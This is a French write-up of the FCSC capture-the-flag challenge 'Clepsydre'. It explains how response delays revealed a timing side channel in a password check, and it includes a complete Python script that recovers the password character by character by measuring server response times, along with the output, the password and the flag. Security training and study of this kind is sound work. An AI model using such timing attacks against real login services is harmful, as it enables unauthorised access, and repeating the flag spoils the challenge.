# Clepsydre

Points : 173 (Dynamique)

```
À l'origine, la clepsydre est un instrument à eau qui permet de
définir la durée d'un évènement, la durée d'un discours par
exemple. On contraint la durée de l’évènement au temps de
vidage d'une cuve contenant de l'eau qui s'écoule par un petit
orifice. Dans l'exemple du discours, l'orateur doit s'arrêter
quand le récipient est vide. La durée visualisée par ce moyen
est indépendante d'un débit régulier du liquide ; le récipient
peut avoir n'importe quelle forme. L'instrument n'est donc pas
une horloge hydraulique (Wikipedia).

Service : nc challenges2.france-cybersecurity-challenge.fr 6006
```

## Analyse

Au début, je pensais à une sorte d'énigme. Alors, j'ai cherché et regardé ce qu'était un Clespydre sur wikipedia.

Suite à cela, je me suis connecté au challenge où une petite citation est affichée.

```
[Citation du jour] : "Tout vient à point à qui sait attendre".

Entrez votre mot de passe :
```

Décidemment, ça fait beaucoup d'allusion au mot TEMPS pour ne pas qu'il y ait un rapport.

## Résolution ?

J'ai donc dans un premier temps, essayé de me connecter et d'attendre en espérant que le flag apparaisse...

Ca n'as pas fonctionné. Cela dit ça aurait été beau.

Je me suis ensuite fait une liste de synonyme du mot temps, que j'ai rentrée avec et sans majuscule à la première lettre de chaque mot.

ET bizarrement le mot de passe ```Temps``` m'était beaucoup plus de TEMPS à être traité que les autres.

J'ai essayé seulement avec la lettre ```T``` pareil. Je dois donc avoir affaire à un ```Service - Timming attack```.

## Récupération du mot de passe

J'ai commencé à faire un programme qui récupérera le premier message puis enregistrera une première fois le temps actuel.

Il lancera la requête et récupèrera à nouveau le message envoyé par le serveur.

Ensuite, il pourra calculer le temps de réponse qu'il mettra dans une liste et un dictionnaire avec le carcatère associé.

Une fois tous les caractères testés, il m'affichera celui qui aura mis le plus de temps à répondre.

*Dans ce genre de challenge, je conseille de lancer le script en double et de vérifier que les valeurs renvoyées soient les mêmes. Ca évite de faire tourner le programme pour rien alors qu'un caractère n'est pas bon*

Voici le code :

```python
#!/usr/bin/python3

import string
import socket
import time
import sys

#CHAR IN KEY
CHAR = string.printable[:95]
#HOST INFORMATION
HOST = "challenges2.france-cybersecurity-challenge.fr"
PORT = 6006

#function exploit
def exploit(key):
    #Var for the time
    dict_time = dict()
    list_time = list()

    #loop in all char
    for number in CHAR:
        #get the flag
        msg = key + number + "\n"
        #Create TCP connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(20)
        #Connect to the server
        s.connect((HOST, PORT))
        #Recv data
        s.recv(1024)
        #encode it
        msg = msg.encode()
        #get the time
        time_stamp = time.time()
        #send it
        s.send(msg)
        #Get the response
        try:
            res = s.recv(1024)
        except socket.timeout:
            continue
        if "FCSC" in res.decode():
            print("[+] Flag ? : {0}".format(msg))
            print(res.decode())
            sys.exit(0)
        #get the total time
        time_stamp = time.time() - time_stamp
        #add the time to dict
        dict_time[time_stamp] = number
        #add the time to list
        list_time.append(time_stamp)
        #Close the connection
        s.close()


    #Get the max time of list_time
    #print(list_time)
    _max = max(list_time)
    #Get the char corresponding of the max time
    value = dict_time[_max]
    #return them
    return value

if __name__ == "__main__":
    #r is the key
    r = str()
    while True:
        #Get the all key
        r += exploit(r)
        print("Key : " + r)
```

output :

```
[+] Key : T
[+] Key : T3
[+] Key : T3m
[+] Key : T3mp
[+] Key : T3mp#
[+] Flag ? : b'T3mp#!\n'


Félicitations vous avez su vaincre votre impatience : 

FCSC{6bdd5f185a5fda5ae37245d355f757eb0bbe888eea004cda16cf79b2c0d60d32}
```

flag : ```FCSC{6bdd5f185a5fda5ae37245d355f757eb0bbe888eea004cda16cf79b2c0d60d32}```
